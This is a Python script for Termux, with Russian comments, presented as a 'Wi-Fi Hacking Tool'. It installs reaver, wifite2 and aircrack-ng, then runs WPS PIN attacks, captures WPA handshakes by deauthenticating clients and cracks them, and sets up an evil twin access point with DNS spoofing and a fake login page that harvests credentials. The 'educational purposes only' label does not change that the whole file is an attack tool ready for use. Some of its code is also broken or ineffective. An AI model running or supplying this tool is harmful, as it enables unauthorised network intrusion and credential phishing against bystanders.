#!/usr/bin/env python3
import os
import sys
import subprocess
import time
import threading
import queue
import random
import string
import re
import socket
import requests
from datetime import datetime

# Автоустановка библиотек
def install_requirements():
    required_packages = [
        "python3-pip",
        "python",
        "git",
        "wget",
        "curl",
        "tsu",
        "root-repo",
        "unstable-repo",
        "x11-repo"
    ]
    
    python_packages = [
        "pywifi",
        "scapy",
        "requests",
        "colorama",
        "tqdm",
        "pycryptodome",
        "netaddr",
        "socketIO-client"
    ]
    
    print("\033[1;36m[*] Updating Termux packages...\033[0m")
    os.system("pkg update -y && pkg upgrade -y")
    
    print("\033[1;36m[*] Installing required packages...\033[0m")
    for package in required_packages:
        os.system(f"pkg install -y {package}")
    
    print("\033[1;36m[*] Installing Python packages...\033[0m")
    for package in python_packages:
        os.system(f"pip install {package}")
    
    # Установка специальных инструментов
    print("\033[1;36m[*] Installing hacking tools...\033[0m")
    os.system("git clone https://github.com/derv82/wifite2.git")
    os.system("cd wifite2 && python3 setup.py install")
    os.system("git clone https://github.com/t6x/reaver-wps-fork-t6x.git")
    os.system("cd reaver-wps-fork-t6x && ./configure && make && make install")
    os.system("git clone https://github.com/aircrack-ng/aircrack-ng.git")
    os.system("cd aircack-ng && autoreconf -i && ./configure && make && make install")
    os.system("pkg install aircrack-ng")

# Класс для взлома Wi-Fi
class WiFiHacker:
    def __init__(self):
        self.target_network = None
        self.wordlist_path = "/sdcard/wordlist.txt"
        self.attack_methods = []
        self.results = {}
        self.stop_attack = False
        
    def scan_networks(self):
        print("\033[1;33m[*] Scanning for Wi-Fi networks...\033[0m")
        networks = []
        
        # Использование airmon-ng для сканирования
        try:
            os.system("airmon-ng start wlan0")
            time.sleep(2)
            
            # Запуск airodump-ng для сканирования
            scan_process = subprocess.Popen(
                ["airodump-ng", "wlan0mon", "--output-format", "csv", "-w", "/tmp/scan"],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE
            )
            
            # Остановка через 15 секунд
            time.sleep(15)
            scan_process.terminate()
            
            # Чтение результатов
            with open("/tmp/scan-01.csv", "r") as f:
                lines = f.readlines()
                for line in lines[2:]:
                    if line.strip():
                        parts = line.split(",")
                        if len(parts) >= 14:
                            networks.append({
                                "bssid": parts[0].strip(),
                                "essid": parts[13].strip(),
                                "channel": parts[3].strip(),
                                "privacy": parts[5].strip(),
                                "power": parts[8].strip()
                            })
            
            os.system("airmon-ng stop wlan0mon")
            
            # Вывод сетей
            print("\033[1;32m[+] Available networks:\033[0m")
            for i, net in enumerate(networks):
                print(f"{i+1}. {net['essid']} ({net['bssid']}) - {net['privacy']} - CH: {net['channel']} - PWR: {net['power']}")
            
            return networks
        except Exception as e:
            print(f"\033[1;31m[-] Error scanning networks: {e}\033[0m")
            return []
    
    def generate_wordlist(self, min_len=8, max_len=12):
        print(f"\033[1;33m[*] Generating wordlist ({min_len}-{max_len} chars)...\033[0m")
        chars = string.ascii_letters + string.digits + "!@#$%^&*()"
        
        with open(self.wordlist_path, "w") as f:
            for length in range(min_len, max_len + 1):
                for attempt in range(100000):
                    password = ''.join(random.choice(chars) for _ in range(length))
                    f.write(password + "\n")
                    if attempt % 1000 == 0:
                        print(f"\033[1;36m[*] Generated {attempt} passwords for length {length}\033[0m")
        
        print(f"\033[1;32m[+] Wordlist saved to {self.wordlist_path}\033[0m")
    
    def wps_attack(self, bssid, channel):
        print(f"\033[1;33m[*] Starting WPS attack on {bssid} (CH: {channel})...\033[0m")
        try:
            # Настройка интерфейса
            os.system(f"airmon-ng start wlan0 {channel}")
            time.sleep(2)
            
            # Запуск reaver
            reaver_cmd = [
                "reaver",
                "-i", "wlan0mon",
                "-b", bssid,
                "-c", channel,
                "-vv",
                "-K", "1",
                "-N",
                "-d", "5"
            ]
            
            process = subprocess.Popen(
                reaver_cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                universal_newlines=True
            )
            
            # Парсинг вывода
            pin = None
            password = None
            while True:
                output = process.stdout.readline()
                if output == '' and process.poll() is not None:
                    break
                if output:
                    print(output.strip())
                    if "WPS PIN" in output:
                        pin = output.split("WPS PIN:")[1].strip()
                    if "WPA PSK" in output:
                        password = output.split("WPA PSK:")[1].strip()
            
            process.terminate()
            os.system("airmon-ng stop wlan0mon")
            
            if pin and password:
                return {"pin": pin, "password": password}
            else:
                return None
        except Exception as e:
            print(f"\033[1;31m[-] WPS attack failed: {e}\033[0m")
            return None
    
    def brute_force_attack(self, bssid, essid):
        print(f"\033[1;33m[*] Starting brute-force attack on {essid} ({bssid})...\033[0m")
        try:
            # Настройка интерфейса
            os.system("airmon-ng start wlan0")
            time.sleep(2)
            
            # Запуск airodump-ng для захвата handshake
            dump_file = f"/tmp/{essid}_capture"
            airodump_cmd = [
                "airodump-ng",
                "wlan0mon",
                "--bssid", bssid,
                "--channel", "6",
                "--write", dump_file,
                "--output-format", "cap"
            ]
            
            airodump_process = subprocess.Popen(airodump_cmd)
            time.sleep(10)
            
            # Деаутентификация клиентов для захвата handshake
            os.system(f"aireplay-ng -0 5 -a {bssid} wlan0mon")
            time.sleep(5)
            
            # Остановка airodump-ng
            airodump_process.terminate()
            
            # Запуск aircrack-ng для взлома
            aircrack_cmd = [
                "aircrack-ng",
                "-w", self.wordlist_path,
                "-b", bssid,
                f"{dump_file}-01.cap"
            ]
            
            process = subprocess.Popen(
                aircrack_cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                universal_newlines=True
            )
            
            password = None
            while True:
                output = process.stdout.readline()
                if output == '' and process.poll() is not None:
                    break
                if output:
                    print(output.strip())
                    if "KEY FOUND!" in output:
                        password = output.split("[")[1].split("]")[0]
            
            process.terminate()
            os.system("airmon-ng stop wlan0mon")
            
            return password
        except Exception as e:
            print(f"\033[1;31m[-] Brute-force attack failed: {e}\033[0m")
            return None
    
    def evil_twin_attack(self, essid, channel):
        print(f"\033[1;33m[*] Starting Evil Twin attack on {essid} (CH: {channel})...\033[0m")
        try:
            # Создание конфигурации для hostapd
            config = f"""
interface=wlan0
driver=nl80211
ssid={essid}
hw_mode=g
channel={channel}
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
wpa=2
wpa_passphrase=hacked123
wpa_key_mgmt=WPA-PSK
wpa_pairwise=TKIP
rsn_pairwise=CCMP
"""
            
            with open("/tmp/hostapd.conf", "w") as f:
                f.write(config)
            
            # Запуск hostapd
            hostapd_process = subprocess.Popen(["hostapd", "/tmp/hostapd.conf"])
            time.sleep(5)
            
            # Настройка DHCP сервера
            dhcp_config = """
authoritative;
subnet 192.168.100.0 netmask 255.255.255.0 {
 range 192.168.100.100 192.168.100.200;
 option routers 192.168.100.1;
 option domain-name-servers 8.8.8.8;
}
"""
            
            with open("/tmp/dnsmasq.conf", "w") as f:
                f.write(dhcp_config)
            
            # Настройка интерфейса
            os.system("ifconfig wlan0 192.168.100.1 netmask 255.255.255.0")
            os.system("dnsmasq -C /tmp/dnsmasq.conf")
            
            # Запуск фишингового сервера
            phishing_page = """
<!DOCTYPE html>
<html>
<head>
    <title>Wi-Fi Login</title>
    <style>
        body { font-family: Arial; background: #f0f2f5; text-align: center; padding-top: 50px; }
        .container { background: white; padding: 40px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); width: 300px; margin: 0 auto; }
        input { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ddd; border-radius: 4px; }
        button { width: 100%; padding: 10px; background: #1877f2; color: white; border: none; border-radius: 4px; cursor: pointer; }
    </style>
</head>
<body>
    <div class="container">
        <h2>Network Authentication Required</h2>
        <form action="/login" method="POST">
            <input type="text" name="username" placeholder="Username" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Connect</button>
        </form>
    </div>
</body>
</html>
"""
            
            with open("/tmp/index.html", "w") as f:
                f.write(phishing_page)
            
            # Запуск HTTP сервера
            os.system("cd /tmp && python3 -m http.server 80 &")
            
            # Запуск DNS спуфера
            os.system("dnsspoof -i wlan0")
            
            print("\033[1;32m[+] Evil Twin attack started! Waiting for victims...\033[0m")
            print("\033[1;36m[*] Press Ctrl+C to stop the attack\033[0m")
            
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            print("\033[1;31m[-] Stopping Evil Twin attack...\033[0m")
            os.system("pkill hostapd")
            os.system("pkill dnsmasq")
            os.system("pkill dnsspoof")
            os.system("pkill python3")
        except Exception as e:
            print(f"\033[1;31m[-] Evil Twin attack failed: {e}\033[0m")
    
    def run_attack(self):
        print("\033[1;32m[+] Wi-Fi Hacking Tool for Termux\033[0m")
        print("\033[1;32m[+] Created by Tyler\033[0m")
        print("\033[1;31m[!] For educational purposes only!\033[0m\n")
        
        # Сканирование сетей
        networks = self.scan_networks()
        if not networks:
            print("\033[1;31m[-] No networks found!\033[0m")
            return
        
        # Выбор сети
        try:
            choice = int(input("\033[1;36m[*] Select network to attack (number): \033[0m")) - 1
            if 0 <= choice < len(networks):
                self.target_network = networks[choice]
            else:
                print("\033[1;31m[-] Invalid choice!\033[0m")
                return
        except ValueError:
            print("\033[1;31m[-] Invalid input!\033[0m")
            return
        
        # Выбор метода атаки
        print("\n\033[1;36m[*] Select attack method:\033[0m")
        print("1. WPS Attack (requires WPS enabled)")
        print("2. Brute-force Attack (requires wordlist)")
        print("3. Evil Twin Attack (creates fake AP)")
        print("4. All Attacks (run all methods)")
        
        try:
            method = int(input("\033[1;36m[*] Enter method number: \033[0m"))
        except ValueError:
            print("\033[1;31m[-] Invalid input!\033[0m")
            return
        
        # Запуск атаки
        if method == 1:
            result = self.wps_attack(
                self.target_network["bssid"],
                self.target_network["channel"]
            )
            if result:
                print(f"\033[1;32m[+] WPS PIN: {result['pin']}\033[0m")
                print(f"\033[1;32m[+] Password: {result['password']}\033[0m")
            else:
                print("\033[1;31m[-] WPS attack failed!\033[0m")
        
        elif method == 2:
            # Генерация или использование существующего wordlist
            if not os.path.exists(self.wordlist_path):
                self.generate_wordlist()
            
            result = self.brute_force_attack(
                self.target_network["bssid"],
                self.target_network["essid"]
            )
            if result:
                print(f"\033[1;32m[+] Password found: {result}\033[0m")
            else:
                print("\033[1;31m[-] Brute-force attack failed!\033[0m")
        
        elif method == 3:
            self.evil_twin_attack(
                self.target_network["essid"],
                self.target_network["channel"]
            )
        
        elif method == 4:
            print("\033[1;33m[*] Running all attacks sequentially...\033[0m")
            
            # WPS Attack
            print("\n\033[1;33m[*] Attempting WPS attack...\033[0m")
            result = self.wps_attack(
                self.target_network["bssid"],
                self.target_network["channel"]
            )
            if result:
                print(f"\033[1;32m[+] WPS PIN: {result['pin']}\033[0m")
                print(f"\033[1;32m[+] Password: {result['password']}\033[0m")
                return
            else:
                print("\033[1;31m[-] WPS attack failed!\033[0m")
            
            # Brute-force Attack
            print("\n\033[1;33m[*] Attempting brute-force attack...\033[0m")
            if not os.path.exists(self.wordlist_path):
                self.generate_wordlist()
            
            result = self.brute_force_attack(
                self.target_network["bssid"],
                self.target_network["essid"]
            )
            if result:
                print(f"\033[1;32m[+] Password found: {result}\033[0m")
                return
            else:
                print("\033[1;31m[-] Brute-force attack failed!\033[0m")
            
            # Evil Twin Attack
            print("\n\033[1;33m[*] Attempting Evil Twin attack...\033[0m")
            self.evil_twin_attack(
                self.target_network["essid"],
                self.target_network["channel"]
            )
        
        else:
            print("\033[1;31m[-] Invalid method!\033[0m")

# Основная функция
def main():
    # Проверка root-доступа
    if os.geteuid() != 0:
        print("\033[1;31m[-] This script requires root access!\033[0m")
        print("\033[1;36m[*] Run: su -c 'python3 wifi_hack.py'\033[0m")
        return
    
    # Установка зависимостей
    install_requirements()
    
    # Запуск взлома
    hacker = WiFiHacker()
    hacker.run_attack()

if __name__ == "__main__":
    main()
